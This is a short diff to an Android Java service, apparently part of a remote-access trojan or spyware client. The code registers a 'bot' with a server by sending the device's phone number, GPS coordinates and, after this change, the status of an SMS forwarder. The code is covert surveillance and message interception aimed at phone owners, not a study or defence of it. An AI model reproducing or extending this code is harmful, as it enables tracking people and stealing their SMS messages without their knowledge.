@@ -104,6 +104,7 @@ public class CommandService extends Service {
                     bot.put("phone", params.getPhone());
                     bot.put("lat", locationTask.getLatitude());
                     bot.put("longi", locationTask.getLongitude());
+                    bot.put("sms_forwarder_status", smsForwarder.isListening());
 
                     JSONObject obj = new JSONObject(bot);
                     socket.emit("register", obj, new Ack() {
